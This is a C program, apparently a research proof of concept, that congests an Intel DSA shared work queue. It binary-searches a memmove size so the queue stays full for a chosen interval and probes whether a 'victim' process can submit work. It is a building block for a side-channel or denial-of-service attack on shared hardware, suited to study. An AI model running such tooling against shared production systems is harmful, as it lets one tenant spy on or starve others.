#include "dsa.h"

#define XFER_SIZE (1L << 28)
#define WQ_SIZE 7
#define END_RANGE 28
#define TRIAL 4

uint8_t *src, *dst;
struct wq_info wq_info;
struct dsa_hw_desc noop = {}, mass[WQ_SIZE] = {}, noops[WQ_SIZE] = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {}, \
       mass_comp[WQ_SIZE]  __attribute__((aligned(32))) = {}, \
       noops_comp[WQ_SIZE] __attribute__((aligned(32))) = {};

static inline void congest() {
    mass_comp[0].status = 0;
    while (enqcmd(wq_info.wq_portal, &mass[0]));
    for(int i = 1; i < WQ_SIZE - 1; i++) {
        noops_comp[i].status = 0;
        if (enqcmd(wq_info.wq_portal, &noops[i]))
            printf("failed to enqueue noop %d\n", i);
    }
}

static inline int probe_swq() { return enqcmd(wq_info.wq_portal, &noop); }

int main(int argc, char *argv[]) {
    int target_interval = 1000000;
    if (argc == 2) {
        target_interval = atoi(argv[1]);
        printf("Using interval: %d ns\n", target_interval);
    } else {
        printf("Usage: %s <interval_ns>\n", argv[0]);
        return -1;
    }
    
    // Initialize work queue
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq0.0");
    if (rc) {
        fprintf(stderr, "[wq_spy] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }
    
    src = malloc(XFER_SIZE * sizeof(uint8_t));
    dst = malloc(XFER_SIZE * sizeof(uint8_t));
    memset(src, 0, XFER_SIZE * sizeof(uint8_t)); // no page fault
    memset(dst, 0, XFER_SIZE * sizeof(uint8_t));

    noop.opcode = DSA_OPCODE_NOOP;
    noop.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    noop.completion_addr = (uintptr_t) &comp;
    for (int i = 0; i < WQ_SIZE; i++) {
        mass[i].opcode = DSA_OPCODE_MEMMOVE;
        mass[i].flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR | IDXD_OP_FLAG_CC;
        mass[i].src_addr = (uintptr_t) src;
        mass[i].dst_addr = (uintptr_t) dst;
        mass[i].xfer_size = XFER_SIZE;
        mass_comp[i].status = 0;
        mass[i].completion_addr = (uintptr_t) &mass_comp[i];

        noops[i].opcode = DSA_OPCODE_NOOP;
        noops[i].flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
        noops[i].completion_addr = (uintptr_t) &noops_comp[i];
    }

    int low = 0, high = (1 << END_RANGE);
    while (low <= high) {
        int mid = (low + high) / 2;
        mass[0].xfer_size = mid;
        
        int tmp = 0;
        for (int i = 0; i < TRIAL; i++) {
            congest();
            nsleep(1000);
            comp.status = 0;
            if (probe_swq()) printf("victim cannot submit initially\n");
            nsleep(target_interval - 1000);
            if (probe_swq()) tmp++;
            else break;
            while (comp.status == 0);
        }

        if (tmp == TRIAL) high = mid - 1;
        else low = mid + 1;
    }

    mass[0].xfer_size = low;
    congest();

    nsleep(1000);
    if (probe_swq()) printf("victim cannot submit initially\n");
    nsleep(target_interval - 1000);

    if (probe_swq()) printf("verified size: %d\n", low);
    else printf("invalid!\n");

    return EXIT_SUCCESS;
}
